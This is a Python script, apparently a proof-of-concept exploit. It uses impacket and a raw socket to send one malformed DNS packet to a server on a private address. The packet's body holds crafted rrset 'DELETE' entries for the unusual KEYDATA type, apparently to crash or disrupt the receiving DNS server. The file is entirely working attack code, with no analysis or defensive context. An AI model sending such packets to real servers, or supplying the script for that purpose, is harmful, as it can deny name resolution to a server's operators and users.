#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
from impacket import ImpactPacket


## dns payload, rfc 1035, header section
payload  = '\xff\xff'        # ID for request                    (16bit)
payload += '\x28\x00'        # \x28\x00 QR query/response        (1bit)
                             # OPCODE 0 = standard query         (4bit)
                             #        1 = inverse query
                             #        2 = server status request
                             #     3-15 = reserved
                             # AA authoritative answer false/true(1bit)
                             # TC truncation false/true          (1bit)
                             # RD recursion desidered false/true (1bit)
                             # RA recursion available false/true (1bit)
                             # Z  reserved                       (3bit)
                             # RCODE 0 = no error                (4bit)
                             #       1 = format error
                             #       2 = server failure
                             #       3 = name error
                             #       4 = not implemented
                             #       5 = refused
                             #    6-15 = reserved
payload += '\x00\x01'        # QDCOUNT number of questions      u(16bit)
payload += '\x00\x00'        # ANCOUNT number of answers        u(16bit)
payload += '\x00\x02'        # \x00\x02 NSCOUNT number of NS RR u(16bit)
payload += '\x00\x00'        # ARCOUNT number of additional rr  u(16bit)
## question section
payload += '\x07testest'     # QNAME (length of string + string)
payload += '\x02it'
payload += '\x00'            # NULL octet, end of this QNAME
payload += '\x00\x06'        # QTYPE  1:A      2:NS     3:MD     4:MF
                             #        5:CNAME  6:SOA    7:MB     8:MG
                             #        9:MR    10:NULL  11:WKS   12:PTR
                             #       13:HINFO 14:MINFO 15:MX    16:TXT
payload += '\x00\x01'        # QCLASS 1:IN     2:CS     3:CH     4:HS
## rdata zone
payload += '\xc0\x0c'        # \xc0\x0c DELETE
payload += '\xff\xfd'        # \x00\x01 QTYPE rrset to delete KEYDATA 65533
payload += '\x00\xff'        # \x00\xff QCLASS rrset to delete UNUSED
payload += '\x00\x00'        # \x00\x00
payload += '\x00\x00'
payload += '\x00\x00'
payload += '\xc0\x0c'        # \xc0\x0c DELETE
payload += '\xff\xfd'        # \x00\x01 QTYPE rrset to delete KEYDATA 65533
payload += '\x00\x01'        # \x00\xff QCLASS rrset to delete UNUSED
payload += '\x00\x00'        # \x00\x00
payload += '\x00\x0a'
payload += '\x00\x04'
payload += '\x41\x41\x41\x41'

saddr = '192.168.1.130'
daddr = '192.168.1.128'
sport = 53133
dport = 53333

ip = ImpactPacket.IP()
ip.set_ip_src(saddr)
ip.set_ip_dst(daddr)
udp = ImpactPacket.UDP()
udp.set_uh_sport(sport)
udp.set_uh_dport(dport)
udp.contains(ImpactPacket.Data(payload))
ip.contains(udp)
udp.auto_checksum = 1

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)

s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
ret = s.sendto(ip.get_packet(), (daddr, 0))

print("\nsendto %s: %d bytes, ret = %d\n" % (daddr, ip.get_size(), ret))
